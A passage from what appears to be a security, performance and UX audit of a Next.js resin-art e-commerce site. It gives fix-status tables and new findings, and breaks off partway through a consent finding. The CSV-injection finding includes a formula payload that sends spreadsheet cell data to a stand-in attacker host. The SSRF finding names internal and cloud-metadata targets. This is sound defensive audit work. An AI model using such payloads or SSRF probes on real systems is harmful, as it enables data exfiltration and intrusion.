| MKT-202 | Pixel / email capture / remarketing | Major | ◑ Partial | Two small, well-scoped tasks. |
| MKT-203 | Trust signals at conversion | Major | ◑ Partial | Surface existing testimonials at the two conversion pages, reusing what already ships. |
| MKT-204 | OG / share cards | Minor | ◑ Partial | Small fix, three files, no new dependencies or hues. |
| ENG-801 | Cache invalidation after mutations | Major | ◑ Partial | Add public-route revalidation alongside the existing studio revalidations, centralised so each action stays one line. |
| PERF-301 | Animation stack scoping | Major | ◑ Partial | Convert the eager library load in src/components/providers/smooth-scroll-provider.tsx into a conditional dynamic import so GSAP/Lenis bytes are fetched only when they will actually run. |
| PERF-302 | Prisma serverless connections | Major | ◑ Partial | In src/lib/db.ts createClient(), pass explicit pg PoolConfig fields through the PrismaPg constructor (it accepts the full pg.PoolConfig alongside connectionString): `new PrismaPg({ connectionString: env.DATABASE_URL, max: 5, idleTimeoutM… |
| PERF-303 | LCP media optimisation | Critical | ✅ Implemented | — |
| A11Y-401 | Per-theme contrast + focus AA | Major | ◑ Partial | All fixes are one-class swaps reusing existing tokens (no new hues, per palette constraint). |
| A11Y-402 | Form labels / error assoc / keyboard | Major | ◑ Partial | Two small patches. |
| SEO-501 | Structured data + canonicals | Major | ◑ Partial | Two small items, both in existing files, no schema/DB/UI changes: (1) In src/app/(public)/layout.tsx add a third node to BUSINESS_JSONLD's @graph: { "@type": "WebSite", "@id": `${SITE.url}/#website`, name: SITE.name, url: SITE.url, publi… |
| UIUX-601 | Site Settings wired to live chrome | Major | ◑ Partial | Close the remaining hardcoded gaps without touching business rules or theme: (1) add tagline to PublicSiteSettings in src/lib/site-settings.ts (fallback SITE.tagline from src/lib/constants.ts:3), pass it from src/app/(public)/layout.tsx … |
| UIUX-602 | Monolithic forms / shared tables | Major | ◑ Partial | Three residual items, all inside src/components/studio and using only the existing stack (react-hook-form, sonner, shadcn primitives, existing card tokens border-foreground/8 bg-card shadow-luxe-sm): (1) De-duplicate the section helper —… |
| UIUX-603 | WhatsApp payload fidelity | Critical | ✅ Implemented | — |
| DS-701 | Token governance (@theme / hex) | Major | ✎ Adjusted | Four small, token-preserving cleanups (no new hues, all within the existing Midnight Sapphire set): (1) src/app/globals.css:189 — change `border-color: var(--color-border)` to `border-color: var(--border)` so the base default border trac… |

Full residual recommendations (with exact file:line targets and extensibility notes) for every Partial/Adjusted item are carried into the updated implementation plan. Highlights:

- **SEC-104 / PERF-303 / UIUX-603 are fully Implemented** — SVG rejected on every write path + Tiptap sanitised on render; responsive Cloudinary `srcset` with `priority` on true LCP elements; `buildOrderMessage` encodes once, truncates only notes, never drops reference URLs, and persists the `Inquiry` before redirect.
- **SEC-101 (Adjusted)** — repo identity is coherent at HEAD; only `CONTEXT.md:11` carries a stale "no PR base exists yet" claim and the branch is capitalised `Main`. Doc-only cleanup.
- **DS-701 (Adjusted)** — the master doc's premise is inverted: `@theme inline` mapping `--color-*` → `var(--token)` is exactly what makes the `.dark` runtime theming work here; hex sprawl is already governed (one arbitrary `bg-[#c9a233]` remains, plus a latent `var(--color-border)` leak at `globals.css:189`).
- **SEC-102 (Partial, was "Blocker")** — login + reset are throttled (5/15min per email, 15/IP) with failure-only accounting and enumeration-safe reset; the only residual is the in-memory limiter store (per-instance on serverless). Not a Blocker at HEAD.

## C.2 Prior-finding status refresh (2026-07-12 register vs HEAD)

A remediation wave landed after the 2026-07-12 audit (git log: "implement all 37 audit-uiux.md findings", ENG-006/007, CSP headers, rate-limit, tiptap sanitisation, settings wiring). Verified against code at HEAD — not from docs. **57 Fixed · 13 Partial · 5 Open · 1 not verifiable in-repo.**

Still genuinely **Open** (carried into the plan): MKT-004 (no testimonials seeded — owner content), SEO-005 (homepage H1 still keyword-free), PERF-008 (FloatingWhatsApp still imports `motion` on every public route), UIUX-001 (`base`/`panel` bands still ~1.1:1 apart), UIUX-008 (image-less category tiles undifferentiated). **Not verifiable in-repo:** SEC-009 (Resend/Google key rotation is provider-side — owner must confirm).

Notable **Partial** residuals fold into the register topics above: SEC-001→SEC-103 (CSP enforce), SEC-005/ENG-008→SEC-102 (durable store), MKT-006 (testimonial photos + product reviews), MKT-010 (hero H1), SEO-004 (offers node), SEO-007 (Org schema completeness), PERF-004→PERF-301 (motion off static routes), PERF-006 (`three` dep still in package.json), A11Y-004/007→A11Y-402 & UIUX-607 (order-panel chip-group aria), UIUX-002→A11Y-401 (selected-swatch contrast), DS-006 (glass-dark rgba + off-brand `icon.svg` hex).


**SEC**

| ID | Status | Note |
|----|--------|------|
| SEC-001 | ◑ Partial | headers() at next.config.ts:62-72 now enforces HSTS, X-Content-Type-Options: nosniff, Referrer-Policy, Permissions-Policy, and X-Frame-Options (DENY on /studio via lines 67-70), but the CSP ships only as Content-Security-Policy-Report-On… |
| SEC-002 | ✅ Fixed | authorize() now peeks then records a failure-only throttle of 5/15min per email and 15/15min per IP (src/lib/auth.ts:56-85), refusing before the DB lookup when locked; the in-memory backing is explicitly acknowledged at auth.ts:11-13 as … |
| SEC-003 | ✅ Fixed | ACCEPTED_UPLOAD_TYPES (storage.ts:85-94) no longer contains image/svg+xml (deliberate exclusion documented at lines 80-84), and the dev uploads route serves any legacy .svg with Content-Disposition: attachment plus CSP "default-src 'none… |
| SEC-004 | ✅ Fixed | A per-IP rateLimit(`upload:${ip}`, 30/10min) now runs at the top of POST (route.ts:29-37) before the branch split, so it covers the Blob client-token path (handleBlobClientUpload) as well as the multipart fallback. |
| SEC-005 | ◑ Partial | The limiter is still a module-level in-memory Map (per-instance, resets on cold start); the recommendation's documentation half landed (explicit caveat at rate-limit.ts:1-10 plus a MAX_BUCKETS memory bound) but the durable-store backing … |
| SEC-006 | ✅ Fixed | renderTiptapToHtml now pipes generateHTML output through sanitizeGeneratedHtml (tiptap-render.ts:42-48, applied at line 66), which rewrites any href whose scheme is not http(s)/mailto/tel/relative to "#", stripping whitespace and control… |
| SEC-007 | ✅ Fixed | requestPasswordReset now applies rateLimit(`pwreset:${ip}`, 5/15min) and a per-email cooldown that skips token/email regeneration while an unexpired token exists (auth-public.ts:112-123), while still always redirecting to ?sent=1 to pres… |
| SEC-008 | ✅ Fixed | The export handler now calls the shared requireStaff() guard in a try/catch returning 403 (route.ts:31-36), replacing the old any-authenticated session check with the same ADMIN/EDITOR policy as the server actions. |
| SEC-009 | ◇ Not verifiable in repo | Rotation of the previously-exposed Resend key and Google service-account JSON happens in the Resend/GCP consoles and Vercel env vars, leaving no repo artifact to inspect (the repo remains clean — .env.example:7-11 documents only placehol… |
| SEC-010 | ✅ Fixed | referenceUrlSchema now refines every URL to either a /uploads/ prefix or https on *.public.blob.vercel-storage.com (order.ts:39-50), enforced on both product and custom order schemas (order.ts:73,182, max 5) before persisting, and the st… |

**MKT**

| ID | Status | Note |
|----|--------|------|
| MKT-001 | ✅ Fixed | A delegated site-wide WhatsAppTracker (mounted at src/app/(public)/layout.tsx:122) fires track('whatsapp_cta_click', {source, path}) plus a Meta Pixel Contact event for every wa.me/api.whatsapp.com anchor click, with data-wa-source attri… |
| MKT-002 | ✅ Fixed | MarketingScripts (mounted at src/app/(public)/layout.tsx:123) injects Meta Pixel and GA4 via next/script afterInteractive gated on NEXT_PUBLIC_META_PIXEL_ID / NEXT_PUBLIC_GA_ID (declared in src/lib/env.ts:22), and whatsapp-tracker.tsx:35… |
| MKT-003 | ✅ Fixed | A NewsletterForm ('Notify me', tracked as newsletter_subscribe) now renders in the footer (src/components/layout/footer.tsx:104) and in the launching-soon empty state (src/app/(public)/page.tsx:539), backed by the subscribeEmail server a… |
| MKT-004 | ⬜ Open | The testimonials section is still gated on testimonialItems.length > 0, no testimonials are seeded anywhere in prisma/seed*.ts (grep for 'testimonial' returns nothing), and the STATS block is still the same vanity claims (page.tsx:73-87)… |
| MKT-005 | ✅ Fixed | The dead href="#" is gone: the footer Instagram icon renders only when a real instagramUrl is set in studio Site Settings (threaded from src/app/(public)/layout.tsx:119 via settings.socials.instagram), with target=_blank rel=noopener, an… |
| MKT-006 | ◑ Partial | The homepage now emits LocalBusiness AggregateRating + Review[] JSON-LD computed from real Testimonial rows (page.tsx:248-277), but the cards themselves are still text-only — testimonial-carousel.tsx:113-126 renders no customer/piece pho… |
| MKT-007 | ✅ Fixed | The misleading post-resolve place_order_clicked is gone: order-panel now fires order_form_started once on first interaction (order-panel.tsx:152 via onFocusCapture at :295), order_submit_attempt before the async call (:255), and order_su… |
| MKT-008 | ✅ Fixed | A three-item reason-to-believe list ('Poured, cured & finished by hand', 'Shipped safely, insured, across India', 'Price & timeline confirmed on WhatsApp — no payment now') now sits between the price/timeline chip and #order-panel (page.… |
| MKT-009 | ✅ Fixed | The default announcement is now the offer line 'Commissions open — bespoke resin art & keepsakes, made to order.', it is rendered as a clickable Link because the public layout passes announcementHref="/shop" (src/app/(public)/layout.tsx:… |
| MKT-010 | ◑ Partial | Commit 1995e5a ('MKT-010 — hero clarity') added the WhatsApp-ordering promise to the sub-headline ('…ordered simply over WhatsApp', home-hero.tsx:69-73), but the H1 remains the purely poetic 'Liquid luxury, cast forever.' (home-hero.tsx:… |
| MKT-011 | ✅ Fixed | generateMetadata now falls the description back through seoDescription → shortTagline → a whitespace-normalized 200-char trim of product.description (page.tsx:88-94) and the OG image back to ogImage \|\| images[0].url absolutized against S… |

**ENG**

| ID | Status | Note |
|----|--------|------|
| ENG-001 | ✅ Fixed | The public layout now awaits getSiteSettings() and threads settings into the chrome — announcement into DynamicHeader (layout.tsx:103, rendered by AnnouncementBar at src/components/layout/dynamic-header.tsx:178), whatsappNumber/phone/ema… |
| ENG-002 | ✅ Fixed | src/lib/env.ts now exists with a Zod schema (required DATABASE_URL + AUTH_SECRET, typed-optional RESEND_*/NEXT_PUBLIC_*/scraper vars, env.ts:13-36) that throws loudly at module load (env.ts:44), and db.ts imports it and uses env.DATABASE… |
| ENG-003 | ✅ Fixed | sendContactNotification now sends with `from: studioFrom()` (with an inline ENG-003 comment at email.ts:48-49) instead of the hardcoded Resend sandbox sender, matching the password-reset path (email.ts:136). |
| ENG-004 | ✅ Fixed | The dead useEffect import is gone (line 3 now imports only useState) and every cited form was migrated from destructured watch() to compiler-friendly useWatch({control, name}) (blog-post-form.tsx:171, page-form.tsx:112-113, portfolio-for… |
| ENG-005 | ✅ Fixed | The recommended policy landed: `git ls-files src/generated` returns nothing at HEAD (the generated Prisma client is untracked), .gitignore:40 still lists /src/generated, and package.json:12 keeps `postinstall: prisma generate` to regener… |
| ENG-006 | ✅ Fixed | product-form.tsx is now a 141-line orchestrator wrapping FormProvider, decomposed exactly as recommended into src/components/studio/products/product-form/{schema.ts, essentials-section, pricing-specs-section, occasions-section, care-note… |
| ENG-007 | ✅ Fixed | The JSON-LD is now data-wired: sameAs is populated from settings.socials (layout.tsx:62-67, merged into both graph nodes at :81) and the LocalBusiness PostalAddress gains streetAddress from settings.address (layout.tsx:72-74, :82) with t… |
| ENG-008 | ◑ Partial | The limiter is still a per-instance module-level Map (rate-limit.ts:14) with no durable store (no Upstash/Vercel KV/redis anywhere in src), so the per-instance fan-out weakness described remains at runtime; the audit's minimum-acceptable… |

**SEO**

| ID | Status | Note |
|----|--------|------|
| SEO-001 | ✅ Fixed | Search metadata now sets robots { index:false, follow:true } plus canonical "/search" (lines 30-31), and sitemap.ts:20-21 explicitly omits /search from STATIC_ROUTES with a comment citing SEO-001. |
| SEO-002 | ✅ Fixed | generateMetadata now returns alternates: { canonical: `/shop/${slug}` } with a comment citing SEO-002, collapsing ?occasion/?band/?sort/?q filter permutations onto the clean category URL. |
| SEO-003 | ✅ Fixed | Category pages now emit both a BreadcrumbList (lines 93-106) and a CollectionPage with an ItemList of SSR product URLs (lines 108-124), rendered via <JsonLd> at lines 128-129. |
| SEO-004 | ◑ Partial | brand: { "@type": "Brand", name: SITE.name } added (line 217) and the empty image array is now gated/omitted (lines 212-216), but enquire-only pieces still carry no offers node by explicit design (lines 219-232 comment: 'no offer rather … |
| SEO-005 | ⬜ Open | The homepage h1 is still the keyword-free slogan "Liquid luxury, cast forever." with the keyword copy still in a non-heading eyebrow <p> (lines 51-53), and the first h2 below the hero ("Born from the ocean, poured by hand", src/app/(publ… |
| SEO-006 | ✅ Fixed | Root metadata now includes openGraph { type:"website", siteName, locale:"en_IN", url } and twitter { card:"summary_large_image" } (lines 31-37) with a comment citing SEO-006, inheriting to every route via the Metadata API. |
| SEO-007 | ◑ Partial | sameAs is now populated at runtime from Site Settings socials (lines 62-85), plus ContactPoint with contactType customer service (lines 29-36), priceRange "₹₹–₹₹₹" (line 49), hasMap (line 50) and settings-driven streetAddress (lines 72-7… |
| SEO-008 | ✅ Fixed | category.findMany now filters to categories with at least one PUBLISHED non-DEMO product (lines 38-43, comment cites SEO-008), and static routes gain lastModified (build-time generatedAt) plus changeFrequency "weekly" (lines 55-63). |

**PERF**

| ID | Status | Note |
|----|--------|------|
| PERF-001 | ✅ Fixed | A width-injecting Cloudinary loader (w_{width},c_limit) is applied via ResponsiveImage (src/components/media/responsive-image.tsx:19-21) to the hero/about/homepage-feature/category images so Next emits a real srcset, while product cards … |
| PERF-002 | ✅ Fixed | SmoothScrollProvider was moved out of the root layout (src/app/layout.tsx:50-58 no longer mounts it) into the (public) group only, so the entire /studio surface no longer loads GSAP/Lenis; the legal pages still load it because they sit i… |
| PERF-003 | ✅ Fixed | The public contact form no longer imports zod/zodResolver — validation is hand-rolled react-hook-form rules mirroring the still-authoritative server-action schema, and zod imports now exist only in src/components/studio/** forms. |
| PERF-004 | ◑ Partial | The baseline was trimmed (studio dropped via PERF-002, zod off /contact, CursorGlow rewritten without motion at src/components/motion/cursor-glow.tsx:1-73), but the recommendation's core target is unmet: gsap+Lenis (SmoothScrollProvider,… |
| PERF-005 | ✅ Fixed | The Behold widget.js injection is now gated behind an IntersectionObserver with a 300px rootMargin (script injected only after the load flag flips at line 69), plus a skeleton and a 3.5s Instagram/WhatsApp fallback. |
| PERF-006 | ◑ Partial | Dead HeroCanvas/ResinScene files are deleted (src/components/three/ no longer exists) and @react-three/fiber, drei and postprocessing were removed, but the unused "three": "^0.185.1" dependency remains in package.json with zero `from "th… |
| PERF-007 | ✅ Fixed | EXIT_AFTER_MS is now 600ms with a 1200ms hard cap (was 1400/2000), and the overlay is pointer-events-none with the scroll-lock removed (lines 64-74), so it fades over content the user can already scroll/tap — within the recommended 600-9… |
| PERF-008 | ⬜ Open | FloatingWhatsApp still imports motion/react solely for the one-shot mount spring (motion.div with spring transition at lines 79-85); the recommended CSS-keyframe replacement was not applied, so this layout-level component continues to he… |
| PERF-009 | ✅ Fixed | The recommended mitigation is implemented — Lenis now bails out on (pointer: coarse) devices (in addition to the existing reduced-motion guard), so touch/low-end mobile keeps native scrolling; the actual INP improvement is a runtime metr… |

**A11Y**

| ID | Status | Note |
|----|--------|------|
| A11Y-001 | ✅ Fixed | The .dark block now overrides --destructive to #ef7d72 (~7.4:1 on #0a0a0a, comment explicitly cites A11Y-001), so all text-destructive error copy on the public dark canvas clears AA. |
| A11Y-002 | ✅ Fixed | The .dark canvas gets a dedicated bright ring --ring: #5b9dff used by the global :focus-visible outline (globals.css:238-240), and buttonVariants (src/components/ui/button.tsx:8) replaced ring-ring/50 with full-opacity focus-visible:ring… |
| A11Y-003 | ✅ Fixed | An explicit Tab/Shift+Tab focus trap (lines 118-141, commented 'Focus trap (A11Y-003)') now contains focus in the mobile-menu dialog and the sibling header is made inert while open (line 163); the page <main> relies on aria-modal=true pl… |
| A11Y-004 | ◑ Partial | Notes/name/phone/email now have aria-describedby + id'd role=alert errors and submit focuses the first [aria-invalid] control (order-panel.tsx:226-234), and contact-form.tsx wires aria-describedby/role=alert with react-hook-form's defaul… |
| A11Y-005 | ✅ Fixed | Both layouts ship a first-focusable sr-only/focus:not-sr-only skip link targeting an id'd main: public href=#main-content -> <main id="main-content"> (layout.tsx:96,107) and studio href=#studio-content -> <main id="studio-content"> (src/… |
| A11Y-006 | ✅ Fixed | The widget region now has aria-label="ResinRiva on Instagram" (lines 98-99), a loading skeleton, hydration detection via MutationObserver, and a 3.5s timeout fallback rendering a real 'View us on Instagram' link (or a WhatsApp link when … |
| A11Y-007 | ◑ Partial | Name/phone inputs now carry required + aria-required with sr-only '(required)' label text (order-panel.tsx:407-419, 433-447), SELECT triggers get aria-required (line 578), and the OrderField asterisk is paired with sr-only '(required)' (… |
| A11Y-008 | ✅ Fixed | The search input placeholder was raised from porcelain/40 to placeholder:text-porcelain/60 (~#969697 on the dark canvas, roughly 6:1), meeting the audit's recommended /55-60 floor, and the shared Input default uses text-muted-foreground … |
| A11Y-009 | ✅ Fixed | --header-ink-soft was raised from 0.72-0.75 to 0.85 opacity in both :root (line 58) and .dark (line 97) with comments citing A11Y-009, matching the audit's recommended remedy for the 13px announcement/nav ink (announcement-bar.tsx:28 sti… |

**UIUX**

| ID | Status | Note |
|----|--------|------|
| UIUX-001 | ⬜ Open | Tones were honestly renamed (porcelain/ice -> base/panel per DS-003, section.tsx:3-14) but the visual defect is untouched: .dark still maps --background #0a0a0a vs --card #101319 (~1.1:1), Section adds no hairline/shadow to panel bands, … |
| UIUX-002 | ◑ Partial | The gold badge half is fixed (badge.tsx:14 now uses text-gold-ink and .dark overrides --gold-ink to #e3c56a at globals.css:89), but the selected SWATCH chip still renders 'border-sapphire bg-sapphire/10 text-sapphire-deep' and --sapphire… |
| UIUX-003 | ✅ Fixed | Exactly the recommended fix: the reveal now gates on Promise.race([document.fonts.ready, 400ms timeout]) with a comment citing UIUX-003 (lines 157-159), so a slow webfont can never hold the hero H1/LCP hidden beyond a 400ms cap. |
| UIUX-004 | ✅ Fixed | The FAB is lifted to 'bottom-24 lg:bottom-5' on /product/* and /custom-order routes via a pathname check (lines 39-41, comment cites UIUX-004), clearing the sticky mobile CTA, which itself now also hides and goes inert while the order pa… |
| UIUX-005 | ✅ Fixed | The widget region now reserves min-h-[220px] against CLS, shows a 4-tile pulse skeleton while loading (lines 106-118), and after a 3.5s hydration timeout (MutationObserver + timer, lines 67-90) swaps to a static 'View us on Instagram' li… |
| UIUX-006 | ✅ Fixed | The QuickView slot is now pointer-events-none while opacity-0 (no more invisible tap interception) and '[@media(hover:none)]:pointer-events-auto [@media(hover:none)]:opacity-100' keeps it permanently visible and tappable on touch devices… |
| UIUX-007 | ✅ Fixed | A full Tab/Shift+Tab wrap handler now cycles focus among focusable elements inside #mobile-menu (comment cites the superset A11Y-003), and the header behind the overlay is additionally marked inert while the menu is open (dynamic-header.… |
| UIUX-008 | ⬜ Open | Image-less categories still render bare blue gradient tiles with no monogram/name-on-tile differentiation, gradients are still keyed by array index rather than slug (src/app/(public)/page.tsx:241 'BLUE_GRADIENTS[i % BLUE_GRADIENTS.length… |
| UIUX-009 | ✅ Fixed | A shared CharCounter ('{length}/{max}', turns text-destructive plus a non-color 'N left' live-region cue at >=90%) is wired to every capped field — custom-order design idea 2000 and notes 1500 (custom-order-form.tsx:277/292, 363/376), or… |
| UIUX-010 | ✅ Fixed | The dead '#' anchor is gone — the footer Instagram icon renders only when a real profile URL is configured in Site Settings, and the JSON-LD sameAs is now built from those same configured socials and emitted only when non-empty (src/app/… |
| UIUX-011 | ✅ Fixed | The recommended 'constant ink' option was taken: Section dropped the headerTheme prop entirely and hard-codes data-header-theme="dark", while DynamicHeader deleted the IntersectionObserver/MutationObserver hysteresis system — no such cod… |

**DS**

| ID | Status | Note |
|----|--------|------|
| DS-001 | ✅ Fixed | Gold badge variant now uses text-gold-ink backed by a theme-aware token (--gold-ink: #8a6d1a in :root at src/app/globals.css:23, overridden to AA-clearing #e3c56a under .dark at globals.css:89, exposed at :112), and the draft banner at s… |
| DS-002 | ✅ Fixed | The dead-code path was resolved by committing to all-dark: headerTheme was dropped from SectionProps entirely (only tone remains, section.tsx:18-21), data-header-theme="dark" is documented as intentional (section.tsx:24-30), and dynamic-… |
| DS-003 | ✅ Fixed | TONE_CLASSES was renamed to surface-honest names — base, panel, midnight, deep-ocean, void (section.tsx:7-14, comment explicitly cites DS-003) — with porcelain/ice gone from the type, and call sites migrated (e.g. |
| DS-004 | ✅ Fixed | All five text-[#8a6d1a] occurrences are replaced with text-gold-ink (badge.tsx:14, product/[slug]/page.tsx:265, product-form/rewrite-warning.tsx:15 after the ENG-006 form split, add-to-catalog-dialog.tsx:177, approve-import-dialog.tsx:17… |
| DS-005 | ✅ Fixed | The five inline eyebrow clones now use the .eyebrow utility (error.tsx:49, not-found.tsx:46, and the homepage labels at page.tsx:502/:628/:788), and a repo-wide grep finds no remaining text-[13px] lowercase tracking-[0.18em] text-azure c… |
| DS-006 | ◑ Partial | The cited drift is largely fixed — header ink is single-sourced to --header-ink/porcelain tokens (dynamic-header.tsx:25-37), and src/lib/brand-colors.ts centralizes hexes with porcelainAlpha() for OG images/global-error/manifest (global-… |
| DS-007 | ✅ Fixed | A --whatsapp: #25d366 token was added and documented as the deliberate 'live chat' accent (globals.css:25, exposed at :114), the floating button now uses hover:bg-whatsapp (floating-whatsapp.tsx:56), and the accent is applied consistentl… |
| DS-008 | ✅ Fixed | A shared StudioTableHead primitive now owns the header class string once (studio-table-head.tsx:14-24) and is imported by all the cited studio lists and more (product-list.tsx:217, page-list.tsx:81, faq-list.tsx:221, inquiry-list.tsx:197… |
| DS-009 | ✅ Fixed | order-panel now imports BRAND from src/lib/brand-colors.ts (order-panel.tsx:23) and the brand-mirroring swatches reference it — blue: BRAND.sapphire (:68), navy: BRAND.midnight (:69), azure: BRAND.azure (:71), ocean: BRAND.deepOcean (:76… |
| DS-010 | ✅ Fixed | The dead placeholder is gone in code: the footer Instagram icon renders only when a real profile URL is set in studio Site Settings (footer.tsx:55-82, comment: 'no more dead "#" link', MKT-005), Organization/LocalBusiness sameAs is popul… |

### C.3 New findings (2026-07-19 sweep)

All findings below were produced by an 8-lens re-audit of HEAD and independently adversarially re-verified against the code before inclusion. IDs use the master-document century-block scheme (§8) and continue after the register IDs in Part 2. Nothing here reuses or edits an existing `SEC-001…DS-010` ID.

#### Security (SEC)

**[SEC-105] EDITOR can rewrite the WhatsApp order number and hijack the entire order funnel**
- Scope: Studio
- Severity: Major
- Effort: S
- Location: src/actions/settings.ts:83; src/lib/site-settings.ts:61; src/actions/order.ts:137,164,229,259
- Observation: updateSiteSettings gates on the default requireStaff() (src/actions/settings.ts:83 = ADMIN+EDITOR), and the schema lets any staffer overwrite whatsappNumber (settings.ts:41-47); getSiteSettings() returns that stored number (site-settings.ts:61) which submitProductOrder/submitCustomOrder feed straight into buildWaLink for every order deep link (order.ts:164,259).
- Impact: A malicious or compromised EDITOR (a lower-trust content role) edits Settings and sets whatsappNumber to their own account; from that moment 100% of product and custom-order 'Order on WhatsApp' links, plus the floating WhatsApp CTA, route customers to the attacker instead of wa.me/917096036250 — a full order-funnel takeover with no privilege escalation and no ADMIN action, violating the business hard rule that all orders finalize on the owner's WhatsApp.
- Recommendation: Gate the WhatsApp/contact-identity fields behind requireStaff([Role.ADMIN]) — either split updateSiteSettings so brand/announcement stay EDITOR-editable while whatsappNumber/phone/email require ADMIN, or move the whole action to requireStaff([Role.ADMIN]) as users.ts already does; log the old→new number in the existing logActivity meta so a change is auditable.
- Status: Verified

**[SEC-106] Studio JWT sessions are never invalidated on account deletion, role change, or password reset**
- Scope: Studio
- Severity: Major
- Effort: M
- Location: src/lib/auth.config.ts:9-31; src/actions/helpers.ts:13-19; src/actions/users.ts:108-118,201-209
- Observation: authConfig sets session.strategy 'jwt' with no maxAge (NextAuth defaults to a 30-day token) and its jwt callback only copies id/role from `user` at sign-in, never re-reading the DB (auth.config.ts:16-22). requireStaff() then trusts session.user.role from the token with no DB existence/role re-check (helpers.ts:13-19). deleteUsers/updateUserRole/resetUserPassword mutate the row but issue no session revocation (users.ts).
- Impact: An ADMIN fires an EDITOR via deleteUsers, but that person's browser still holds a valid JWT carrying role=EDITOR; middleware and every server action keep honouring it, so the ex-staffer retains full studio write/delete/export access for up to ~30 days. Likewise an ADMIN demoted to EDITOR keeps ADMIN in their frozen token (e.g. can still manage users) until they voluntarily re-login, and an admin-forced password reset does not log the compromised session out.
- Recommendation: Add a durable revocation signal using the existing Prisma stack (no paid infra): a `sessionEpoch`/`tokenVersion` Int on User, embedded in the token in the jwt callback and re-validated against the DB there (bump it in deleteUsers/updateUserRole/resetUserPassword and reject stale tokens); also set an explicit shorter authConfig.session.maxAge. This keeps JWT sessions but makes deletion/demotion/reset effective immediately.
- Status: Verified
- _Cross-lens: also reported by the Engineering lens ("deleted/demoted staff keep studio access for up to 30 days") — same JWT-never-revalidated root cause; consolidated here._

**[SEC-107] Scraper and image-mirror fetches allow SSRF to internal/loopback/link-local targets**
- Scope: Studio
- Severity: Major
- Effort: M
- Location: src/lib/scraper/fingerprint.ts:32-49,57-96; src/lib/scraper/robots.ts:73-83; src/actions/scraper-review.ts:167; src/actions/import.ts:376
- Observation: createScrapeJob accepts a staff-pasted inputUrl (scraper-jobs.ts:268) that normalizeBaseUrl (fingerprint.ts:32-36) only forces to http(s)+host; isBlockedMarketplace blocks marketplace domains but nothing blocks RFC1918/loopback/link-local/internal hostnames. probe()/fingerprint() then fetch that origin with redirect:'follow' (fingerprint.ts:40-48), loadRules fetches {origin}/robots.txt (robots.ts:73), and mirrorScrapedImage/mirrorProductImage fetch arbitrary scraped/imported image URLs (scraper-review.ts:167, import.ts:376).
- Impact: An EDITOR (or a scraped storefront that lists internal image URLs) can point a job or import at http://10.x.x.x:PORT, http://localhost:PORT, or http://169.254.169.254/latest/meta-data/ and the Vercel function will issue the request and follow redirects — a mostly-blind SSRF usable to reach internal-only services, port-scan the private network, or probe the cloud metadata endpoint from a lower-trust account.
- Recommendation: Add a shared guard in the existing stack that, before every scraper/import fetch, resolves the target host and rejects loopback, private (10/8, 172.16/12, 192.168/16), link-local (169.254/16, incl. metadata) and non-http(s) schemes, and re-checks on each redirect hop (or use fetch redirect:'manual' and re-validate). Reuse it in probe(), loadRules(), and both mirror functions; keep the existing marketplace blocklist on top.
- Status: Verified

**[SEC-108] Scraper CSV export is vulnerable to spreadsheet formula (CSV) injection**
- Scope: Studio
- Severity: Minor
- Effort: S
- Location: src/lib/scraper/export.ts:75-124; src/app/api/scraper/export/route.ts:76-82
- Observation: toCsv/csvCell (export.ts:115-124) only apply RFC-4180 quoting; they never neutralize cells beginning with =, +, -, @, tab or CR. rowToScrapeDeck (export.ts:84-113) writes scraped external fields (title, description, shortTagline, category) verbatim, and these originate from third-party sites the studio scrapes (untrusted). The Sheets sync uses valueInputOption RAW (sheets.ts:251,258) so it stores literally — the injection sink is specifically the downloaded .csv.
- Impact: An attacker who controls or influences a storefront that staff scrape can seed a product title/description like =HYPERLINK("https://evil/?"&A1) or =IMPORTXML(...); when a staffer opens the exported CSV in Excel/Google Sheets/LibreOffice the formula executes, enabling data exfiltration of adjacent cells or (legacy Excel DDE) command execution on the reviewer's machine.
- Recommendation: Neutralize formula-leading cells in csvCell before quoting: if a value starts with =, +, -, @, tab or CR, prefix a single quote (or a zero-width guard) so spreadsheet apps treat it as text. This is a one-function change in export.ts and does not affect the RAW Sheets sync path.
- Status: Verified

**[SEC-109] No least-privilege split: EDITOR can bulk-delete customer PII and export the full scrape database**
- Scope: Studio
- Severity: Minor
- Effort: M
- Location: src/actions/inquiries.ts:54; src/actions/products.ts:266; src/app/api/scraper/export/route.ts:33; src/actions/scraper-jobs.ts:561; src/actions/helpers.ts:13
- Observation: Only users.ts uses requireStaff([Role.ADMIN]) (grep confirms 4 call sites, all in users.ts); every other destructive/exfiltration action defaults to requireStaff() = ADMIN+EDITOR — deleteInquiries (inquiries.ts:54, wipes customer name/phone/email/order history), deleteProducts (products.ts:266), deleteMediaItems, deleteScrapeJobs (scraper-jobs.ts:561), and the CSV export route (export.ts route:33, up to 5000 competitor rows).
- Impact: A lower-trust EDITOR — or, combined with the non-revoked-session finding, a just-fired EDITOR — can irreversibly delete all customer inquiries (PII/lead loss and a data-governance exposure), delete the entire catalog, and download the full scraped-product intelligence DB, none of which requires ADMIN. The role boundary that exists for user management is absent from every equally-sensitive data operation.
- Recommendation: Decide per-action which operations are ADMIN-only and pass requireStaff([Role.ADMIN]) to them — at minimum deleteInquiries and the scraper export/delete — mirroring the pattern already used in users.ts; leave routine content edits on the default guard. No new infra; it is a role-argument change plus tests.
- Status: Verified

**[SEC-110] Login flow leaks account existence via bcrypt timing side-channel**
- Scope: Studio
- Severity: Minor
- Effort: S
- Location: src/lib/auth.ts:75-84
- Observation: authorize() runs bcrypt compare only when a user row exists (auth.ts:76-77): a non-existent email returns valid=false with no hashing, while a real email pays the ~bcrypt(12) cost, producing a measurable response-time difference. The per-email/per-IP failure limiter (5/15min, 15/IP) throttles but does not equalize timing.
- Impact: An attacker can distinguish valid staff emails from invalid ones by response latency, aiding targeting for the throttled password-guessing already noted for the single-admin account; low direct impact given the owner email is already public and attempts are rate-limited.
- Recommendation: Always perform a bcrypt compare against a constant dummy hash when no user is found (compare-and-discard) so authorize() takes uniform time regardless of account existence; reuse the existing bcryptjs dependency, no new packages.
- Status: Verified

#### Marketing/CRO (MKT)

**[MKT-205] Meta Pixel + GA4 loaders ship with zero consent mechanism — the documented activation path starts unconsented tracking for every visitor**
- Scope: Public
- Severity: Minor
- Effort: M
- Location: src/components/analytics/marketing-scripts.tsx:15-31; src/components/analytics/whatsapp-tracker.tsx:35; .env.example:17-18
- Observation: MarketingScripts injects fbq('init')+fbq('track','PageView') and gtag('config') the moment NEXT_PUBLIC_META_PIXEL_ID/NEXT_PUBLIC_GA_ID are set, with no consent banner, no stored opt-in state, no Google Consent Mode defaults and no fbq consent revoke — a grep for consent/cookie across src returns only the code comment at marketing-scripts.tsx:10 that defers the obligation to the operator, and .env.example:17 tells the owner to simply set the ID.
